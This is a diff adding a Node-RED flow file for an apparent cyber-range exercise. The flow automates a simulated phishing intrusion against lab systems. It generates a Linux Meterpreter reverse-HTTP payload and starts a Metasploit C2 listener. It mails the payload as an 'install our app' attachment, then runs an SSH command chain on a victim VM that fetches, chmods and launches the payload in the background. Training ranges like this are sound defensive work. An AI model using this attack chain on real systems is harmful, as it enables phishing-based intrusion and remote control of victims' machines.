@@ -1,0 +1,995 @@
+[
+    {
+        "id": "8c231b991cb8a9dc",
+        "type": "tab",
+        "label": "Flow 1",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "9ce0a0e2b09dec83",
+        "type": "tab",
+        "label": "Flow 2",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "71f2184866513a70",
+        "type": "awx-config",
+        "host": "awx-service.awx.svc.cluster.local",
+        "port": "80",
+        "useTLS": false,
+        "rejectUnauthorized": false
+    },
+    {
+        "id": "ea1577dc9963df4e",
+        "type": "cluster-config",
+        "host": "https://172.16.30.169:6443",
+        "clusterName": "cluster.local",
+        "rejectUnauthorized": false,
+        "namespace": "apt999",
+        "helmRepoUrl": "https://harbor.cyber/chartrepo/cyber-range"
+    },
+    {
+        "id": "7c8ed17801b94d4f",
+        "type": "ssh-conf",
+        "ssh": "",
+        "name": "SSH: Victim",
+        "userlabel": "SSH: Victim"
+    },
+    {
+        "id": "baa357db03c78d04",
+        "type": "MsfRpc: Config",
+        "msfrpcHost": "metasploit.apt999.svc.cluster.local",
+        "msfrpcPort": "55553",
+        "msfrpcSSL": true,
+        "msfrpcUser": "msf",
+        "msfrpcPassword": "msf"
+    },
+    {
+        "id": "25f9990832b87100",
+        "type": "scenario-plane-prepare",
+        "z": "8c231b991cb8a9dc",
+        "name": "",
+        "awxService": "71f2184866513a70",
+        "clusterService": "ea1577dc9963df4e",
+        "jobTimeout": "500",
+        "scenarioPlaneNamespace": "apt999",
+        "allowedCommunicationLabels": [
+            {
+                "key": "plane",
+                "value": "fasac-control"
+            }
+        ],
+        "x": 510,
+        "y": 80,
+        "wires": [
+            [
+                "7c4833816ddbdd9e"
+            ],
+            [
+                "bc2ae313f0e4a808"
+            ],
+            []
+        ]
+    },
+    {
+        "id": "5ecf2c2dd21648cc",
+        "type": "inject",
+        "z": "8c231b991cb8a9dc",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 200,
+        "y": 220,
+        "wires": [
+            [
+                "31a8e8da76b673a9"
+            ]
+        ]
+    },
+    {
+        "id": "31a8e8da76b673a9",
+        "type": "scenario-plane-clean",
+        "z": "8c231b991cb8a9dc",
+        "name": "",
+        "awxService": "71f2184866513a70",
+        "clusterService": "ea1577dc9963df4e",
+        "jobTimeout": "500",
+        "x": 200,
+        "y": 80,
+        "wires": [
+            [
+                "25f9990832b87100"
+            ],
+            [
+                "18242503fbefa56b"
+            ],
+            []
+        ]
+    },
+    {
+        "id": "c2a62afb43e60227",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Szenario-Namespace aufräumen",
+        "info": "",
+        "x": 230,
+        "y": 40,
+        "wires": []
+    },
+    {
+        "id": "18242503fbefa56b",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "Error: Print Job Status",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "jobresult",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 200,
+        "y": 140,
+        "wires": []
+    },
+    {
+        "id": "c046eed7b6d5594c",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Netzwerkrichtlinien setzen",
+        "info": "",
+        "x": 510,
+        "y": 40,
+        "wires": []
+    },
+    {
+        "id": "bc2ae313f0e4a808",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "Error: Print Job Status",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "jobresult",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 500,
+        "y": 140,
+        "wires": []
+    },
+    {
+        "id": "7c4833816ddbdd9e",
+        "type": "metasploit-create-meterpreter",
+        "z": "8c231b991cb8a9dc",
+        "name": "",
+        "awxService": "71f2184866513a70",
+        "clusterService": "ea1577dc9963df4e",
+        "jobTimeout": "300",
+        "metasploitServiceName": "blue-nine211",
+        "metasploitPayload": "linux/x64/meterpreter_reverse_http",
+        "metasploitLPORT": 10000,
+        "metasploitLHOST": "metasploit.apt999.svc.cluster.local",
+        "helmReleaseName": "yellow-one342",
+        "metasploitOutput": "elf",
+        "x": 850,
+        "y": 80,
+        "wires": [
+            [
+                "c3efdf46b9753cef"
+            ],
+            [
+                "67cfc7d7daa85712"
+            ],
+            []
+        ]
+    },
+    {
+        "id": "cee5799d19f6ec02",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Meterpreter erstellen",
+        "info": "",
+        "x": 810,
+        "y": 40,
+        "wires": []
+    },
+    {
+        "id": "67cfc7d7daa85712",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "Error: Print Job Status",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "jobresult",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 820,
+        "y": 140,
+        "wires": []
+    },
+    {
+        "id": "f0d2fb6065a8ead1",
+        "type": "http request",
+        "z": "8c231b991cb8a9dc",
+        "name": "",
+        "method": "GET",
+        "ret": "bin",
+        "paytoqs": "ignore",
+        "url": "",
+        "tls": "",
+        "persist": false,
+        "proxy": "",
+        "insecureHTTPParser": false,
+        "authType": "",
+        "senderr": false,
+        "headers": [],
+        "x": 1130,
+        "y": 120,
+        "wires": [
+            [
+                "e17115d74048442f"
+            ]
+        ]
+    },
+    {
+        "id": "c3efdf46b9753cef",
+        "type": "change",
+        "z": "8c231b991cb8a9dc",
+        "name": "msg.payload to msg.url",
+        "rules": [
+            {
+                "t": "move",
+                "p": "payload",
+                "pt": "msg",
+                "to": "url",
+                "tot": "msg"
+            }
+        ],
+        "action": "",
+        "property": "",
+        "from": "",
+        "to": "",
+        "reg": false,
+        "x": 1170,
+        "y": 80,
+        "wires": [
+            [
+                "f0d2fb6065a8ead1"
+            ]
+        ]
+    },
+    {
+        "id": "535ab3c37fbece61",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Meterpreter herunterladen",
+        "info": "",
+        "x": 1170,
+        "y": 40,
+        "wires": []
+    },
+    {
+        "id": "c81a3829ad254d6f",
+        "type": "change",
+        "z": "8c231b991cb8a9dc",
+        "name": "msg.payload to msg.meterpreter",
+        "rules": [
+            {
+                "t": "move",
+                "p": "payload",
+                "pt": "msg",
+                "to": "meterpreter",
+                "tot": "msg"
+            },
+            {
+                "t": "delete",
+                "p": "payload",
+                "pt": "msg"
+            }
+        ],
+        "action": "",
+        "property": "",
+        "from": "",
+        "to": "",
+        "reg": false,
+        "x": 1490,
+        "y": 80,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "e17115d74048442f",
+        "type": "switch",
+        "z": "8c231b991cb8a9dc",
+        "name": "HTTP-Status 200?",
+        "property": "statusCode",
+        "propertyType": "msg",
+        "rules": [
+            {
+                "t": "eq",
+                "v": "200",
+                "vt": "num"
+            },
+            {
+                "t": "else"
+            }
+        ],
+        "checkall": "false",
+        "repair": false,
+        "outputs": 2,
+        "x": 1150,
+        "y": 180,
+        "wires": [
+            [
+                "c81a3829ad254d6f"
+            ],
+            [
+                "c43b2ba7409f2301"
+            ]
+        ]
+    },
+    {
+        "id": "c43b2ba7409f2301",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "Error: Print Job Status",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "jobresult",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 1160,
+        "y": 220,
+        "wires": []
+    },
+    {
+        "id": "ca2e7e165af05d46",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Meterpreter sichern",
+        "info": "",
+        "x": 1450,
+        "y": 40,
+        "wires": []
+    },
+    {
+        "id": "d93816b1ccc85417",
+        "type": "mailserver-start",
+        "z": "8c231b991cb8a9dc",
+        "onload": true,
+        "name": "Mailserver Start: Angreifer",
+        "awxService": "71f2184866513a70",
+        "clusterService": "ea1577dc9963df4e",
+        "jobTimeout": "300",
+        "persistence": false,
+        "persistenceStorage": 100,
+        "mailServiceName": "detrack",
+        "helmReleaseName": "orange-seven484",
+        "mailUsers": [
+            {
+                "user": "sales",
+                "password": "password1234"
+            }
+        ],
+        "x": 510,
+        "y": 360,
+        "wires": [
+            [
+                "7a234fc0733325ad"
+            ],
+            [
+                "2b613ae4d296a01b"
+            ],
+            []
+        ]
+    },
+    {
+        "id": "1d9017f86f662902",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Mailserver des Angreifers starten",
+        "info": "",
+        "x": 530,
+        "y": 320,
+        "wires": []
+    },
+    {
+        "id": "7a234fc0733325ad",
+        "type": "mailserver-start",
+        "z": "8c231b991cb8a9dc",
+        "onload": true,
+        "name": "Mailserver Start: Opfer",
+        "awxService": "71f2184866513a70",
+        "clusterService": "ea1577dc9963df4e",
+        "jobTimeout": "300",
+        "persistence": true,
+        "persistenceStorage": 100,
+        "mailServiceName": "healthforever",
+        "helmReleaseName": "kiwi-one322",
+        "mailUsers": [
+            {
+                "user": "dispo",
+                "password": "password1234"
+            }
+        ],
+        "x": 820,
+        "y": 360,
+        "wires": [
+            [
+                "e901659e3b303d25",
+                "7af7d81b11a74af1"
+            ],
+            [
+                "9492ae5db3dc5fd0"
+            ],
+            []
+        ]
+    },
+    {
+        "id": "33cb5ebe608d86dc",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Mailserver des Opfers starten",
+        "info": "",
+        "x": 840,
+        "y": 320,
+        "wires": []
+    },
+    {
+        "id": "2b613ae4d296a01b",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "Error: Print Job Status",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "jobresult",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 500,
+        "y": 420,
+        "wires": []
+    },
+    {
+        "id": "9492ae5db3dc5fd0",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "Error: Print Job Status",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "jobresult",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 820,
+        "y": 420,
+        "wires": []
+    },
+    {
+        "id": "9a611f2a22ae679f",
+        "type": "e-mail",
+        "z": "8c231b991cb8a9dc",
+        "server": "detrack.apt999.svc.cluster.local",
+        "port": "465",
+        "secure": true,
+        "tls": false,
+        "name": "dispo@healthforever.apt999.svc.cluster.local",
+        "dname": "Send Mail",
+        "x": 1340,
+        "y": 360,
+        "wires": []
+    },
+    {
+        "id": "e901659e3b303d25",
+        "type": "change",
+        "z": "8c231b991cb8a9dc",
+        "name": "Build E-Mail",
+        "rules": [
+            {
+                "t": "move",
+                "p": "meterpreter",
+                "pt": "msg",
+                "to": "payload",
+                "tot": "msg"
+            },
+            {
+                "t": "set",
+                "p": "topic",
+                "pt": "msg",
+                "to": "Special Offer",
+                "tot": "str"
+            },
+            {
+                "t": "set",
+                "p": "description",
+                "pt": "msg",
+                "to": "<!DOCTYPE html> <html> <head> <title>We are Detrack</title> </head> <body>  <h1>We are Detrack</h1> <p>Find our app in the attachment. Install it !!</p>  </body> </html>",
+                "tot": "str"
+            },
+            {
+                "t": "set",
+                "p": "filename",
+                "pt": "msg",
+                "to": "detrack",
+                "tot": "str"
+            },
+            {
+                "t": "delete",
+                "p": "meterpreter",
+                "pt": "msg"
+            }
+        ],
+        "action": "",
+        "property": "",
+        "from": "",
+        "to": "",
+        "reg": false,
+        "x": 1130,
+        "y": 360,
+        "wires": [
+            [
+                "9a611f2a22ae679f"
+            ]
+        ]
+    },
+    {
+        "id": "61be3680a31456ed",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "E-Mail erstellen",
+        "info": "",
+        "x": 1140,
+        "y": 320,
+        "wires": []
+    },
+    {
+        "id": "13e032b0b1e078a4",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "E-Mail an Opfer versenden",
+        "info": "",
+        "x": 1390,
+        "y": 320,
+        "wires": []
+    },
+    {
+        "id": "7af7d81b11a74af1",
+        "type": "vm-start",
+        "z": "8c231b991cb8a9dc",
+        "name": "",
+        "awxService": "71f2184866513a70",
+        "clusterService": "ea1577dc9963df4e",
+        "jobTimeout": 300,
+        "sshServiceName": "blue-three123",
+        "cloudInitUserData": "#cloud-config\nusers:\n- default\n- name: dispo\n  gecos: Dieter Disponent\n  lock_passwd: false\n  sudo: ALL=(ALL) NOPASSWD:ALL\n  passwd: $6$.B8Gf42rJ0V4P1VY$i02rEk8mYBJUW9xgNnjPBDnh0nWjKUE6cK4gLiOP0Nb5gTh1OO9uNYaBt.PSKm2mKcWl6bYSJZljOy6eqmG2K1\nssh_pwauth: True\nwrite_files:\n- content: |\n    Super secret data! Do not view unless you have the clearance.\n  path: /home/dispo/healthforever-contacts.txt",
+        "cloudImage": "harbor.cyber/cyber-range/ubuntu-22-10-server-cloud-custom",
+        "accessibleSshName": "blue-three123.apt999.svc.cluster.local:22",
+        "helmReleaseName": "red-one900",
+        "sshPort": 22,
+        "x": 780,
+        "y": 560,
+        "wires": [
+            [
+                "2783ebfc60c08c14"
+            ],
+            [
+                "33c92963cb88dfd1"
+            ],
+            []
+        ]
+    },
+    {
+        "id": "30515563baa48d52",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "VM: Opfersystem starten",
+        "info": "",
+        "x": 830,
+        "y": 520,
+        "wires": []
+    },
+    {
+        "id": "1197e47e9a0c8de4",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Opfer: Laden der Mail vom Mailserver und Anhang speichern",
+        "info": "",
+        "x": 1280,
+        "y": 520,
+        "wires": []
+    },
+    {
+        "id": "5385ba8062eda7ab",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Meterpreter ausführbar machen und starten",
+        "info": "",
+        "x": 1230,
+        "y": 560,
+        "wires": []
+    },
+    {
+        "id": "2fd81c866b533bd4",
+        "type": "template",
+        "z": "8c231b991cb8a9dc",
+        "name": "Prepare SSH Commands",
+        "field": "payload",
+        "fieldType": "msg",
+        "format": "handlebars",
+        "syntax": "plain",
+        "template": "attachment-downloader --host healthforever.apt999.svc.cluster.local --username dispo@healthforever.apt999.svc.cluster.local --password password1234 --imap-folder INBOX --output /tmp --port 143 --unsecure \\\n&& chmod +x /tmp/detrack \\\n&& nohup /tmp/detrack > /dev/null 2>&1 &",
+        "output": "str",
+        "x": 1170,
+        "y": 600,
+        "wires": [
+            [
+                "9908eb5edbe28fd0"
+            ]
+        ]
+    },
+    {
+        "id": "9908eb5edbe28fd0",
+        "type": "ssh-v3",
+        "z": "8c231b991cb8a9dc",
+        "name": "SSH: Victim",
+        "conf": "7c8ed17801b94d4f",
+        "debug": false,
+        "x": 1130,
+        "y": 660,
+        "wires": [
+            [
+                "17b94351b863fae2"
+            ]
+        ]
+    },
+    {
+        "id": "17b94351b863fae2",
+        "type": "switch",
+        "z": "8c231b991cb8a9dc",
+        "name": "Check Status Code",
+        "property": "session.code",
+        "propertyType": "msg",
+        "rules": [
+            {
+                "t": "eq",
+                "v": "0",
+                "vt": "num"
+            },
+            {
+                "t": "else"
+            }
+        ],
+        "checkall": "true",
+        "repair": false,
+        "outputs": 2,
+        "x": 1310,
+        "y": 660,
+        "wires": [
+            [
+                "b8d9a37cec5bb960"
+            ],
+            [
+                "496b0e7581ee2143"
+            ]
+        ]
+    },
+    {
+        "id": "496b0e7581ee2143",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "Error: SSH Failed",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "true",
+        "targetType": "full",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 1150,
+        "y": 720,
+        "wires": []
+    },
+    {
+        "id": "b8d9a37cec5bb960",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "debug 4",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "true",
+        "targetType": "full",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 1520,
+        "y": 660,
+        "wires": []
+    },
+    {
+        "id": "e991ed9bca1650ea",
+        "type": "metasploit-start",
+        "z": "8c231b991cb8a9dc",
+        "name": "",
+        "awxService": "71f2184866513a70",
+        "clusterService": "ea1577dc9963df4e",
+        "jobTimeout": "300",
+        "persistence": true,
+        "persistenceStorage": 100,
+        "msfrpcdSSL": true,
+        "msfrpcdUser": "msf",
+        "msfrpcdPassword": "msf",
+        "helmReleaseName": "indigo-zero427",
+        "metasploitServiceName": "metasploit",
+        "msfrpcdPort": "55553",
+        "tcpBackConnect1": 10000,
+        "tcpBackConnect2": 10001,
+        "tcpBackConnect3": 10002,
+        "tcpBackConnect4": 10003,
+        "x": 180,
+        "y": 360,
+        "wires": [
+            [
+                "047b30a330042527",
+                "d93816b1ccc85417"
+            ],
+            [
+                "a4c6b32e9b988585"
+            ],
+            []
+        ]
+    },
+    {
+        "id": "a4c6b32e9b988585",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "Error: Print Job Status",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "jobresult",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 200,
+        "y": 420,
+        "wires": []
+    },
+    {
+        "id": "33c92963cb88dfd1",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "Error: Print Job Status",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "jobresult",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 820,
+        "y": 620,
+        "wires": []
+    },
+    {
+        "id": "da9aac56293dcfed",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "C2-Server Metasploit starten",
+        "info": "",
+        "x": 220,
+        "y": 320,
+        "wires": []
+    },
+    {
+        "id": "7cb389b673e0f1ea",
+        "type": "MsfRpc: Listener Start",
+        "z": "8c231b991cb8a9dc",
+        "name": "",
+        "meterpreterWaitTime": 3600,
+        "msfrpcConfig": "baa357db03c78d04",
+        "meterpreterSessionOnlyConnect": true,
+        "x": 200,
+        "y": 620,
+        "wires": [
+            [
+                "af3bd06f815a372d"
+            ]
+        ]
+    },
+    {
+        "id": "af3bd06f815a372d",
+        "type": "debug",
+        "z": "8c231b991cb8a9dc",
+        "name": "debug 5",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 180,
+        "y": 700,
+        "wires": []
+    },
+    {
+        "id": "047b30a330042527",
+        "type": "template",
+        "z": "8c231b991cb8a9dc",
+        "name": "Params for Meterpreter Listener",
+        "field": "payload",
+        "fieldType": "msg",
+        "format": "handlebars",
+        "syntax": "plain",
+        "template": "{\n    \"PAYLOAD\": \"linux/x64/meterpreter_reverse_http\",\n    \"LHOST\": \"metasploit.apt999.svc.cluster.local\",\n    \"LPORT\": \"10000\"\n}",
+        "output": "json",
+        "x": 230,
+        "y": 580,
+        "wires": [
+            [
+                "7cb389b673e0f1ea"
+            ]
+        ]
+    },
+    {
+        "id": "59f47b04b29ea5c4",
+        "type": "comment",
+        "z": "8c231b991cb8a9dc",
+        "name": "Meterpreter-Listener auf C2 starten",
+        "info": "",
+        "x": 240,
+        "y": 540,
+        "wires": []
+    },
+    {
+        "id": "2783ebfc60c08c14",
+        "type": "delay",
+        "z": "8c231b991cb8a9dc",
+        "name": "",
+        "pauseType": "delay",
+        "timeout": "2",
+        "timeoutUnits": "minutes",
+        "rate": "1",
+        "nbRateUnits": "1",
+        "rateUnits": "second",
+        "randomFirst": "1",
+        "randomLast": "5",
+        "randomUnits": "seconds",
+        "drop": false,
+        "allowrate": false,
+        "outputs": 1,
+        "x": 940,
+        "y": 560,
+        "wires": [
+            [
+                "2fd81c866b533bd4"
+            ]
+        ]
+    },
+    {
+        "id": "181dd710a51da161",
+        "type": "vm-start",
+        "z": "9ce0a0e2b09dec83",
+        "name": "",
+        "awxService": "71f2184866513a70",
+        "clusterService": "ea1577dc9963df4e",
+        "jobTimeout": 300,
+        "sshServiceName": "victim",
+        "cloudInitUserData": "#cloud-config\nusers:\n- default\n- name: dispo\n  gecos: Dieter Disponent\n  lock_passwd: false\n  sudo: ALL=(ALL) NOPASSWD:ALL\n  passwd: $6$.B8Gf42rJ0V4P1VY$i02rEk8mYBJUW9xgNnjPBDnh0nWjKUE6cK4gLiOP0Nb5gTh1OO9uNYaBt.PSKm2mKcWl6bYSJZljOy6eqmG2K1\nssh_pwauth: True\nwrite_files:\n- content: |\n    Super secret data! Do not view unless you have the clearance.\n  path: /home/dispo/healthforever-contacts.txt",
+        "cloudImage": "harbor.cyber/cyber-range/ubuntu-22-10-server-cloud-custom",
+        "accessibleSshName": "victim.apt999.svc.cluster.local:22",
+        "helmReleaseName": "blue-zero253",
+        "sshPort": 22,
+        "x": 360,
+        "y": 180,
+        "wires": [
+            [
+                "34694d456a39595b"
+            ],
+            [
+                "0e3c177b6fa55d1b"
+            ],
+            [
+                "34694d456a39595b"
+            ]
+        ]
+    },
+    {
+        "id": "6a6d9f223a1a4f31",
+        "type": "inject",
+        "z": "9ce0a0e2b09dec83",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 160,
+        "y": 80,
+        "wires": [
+            [
+                "181dd710a51da161"
+            ]
+        ]
+    },
+    {
+        "id": "34694d456a39595b",
+        "type": "debug",
+        "z": "9ce0a0e2b09dec83",
+        "name": "debug 3",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 1020,
+        "y": 280,
+        "wires": []
+    },
+    {
+        "id": "0e3c177b6fa55d1b",
+        "type": "workload-stop",
+        "z": "9ce0a0e2b09dec83",
+        "name": "",
+        "awxService": "71f2184866513a70",
+        "clusterService": "ea1577dc9963df4e",
+        "helmReleaseName": "",
+        "jobTimeout": 120,
+        "x": 440,
+        "y": 340,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    }
+]
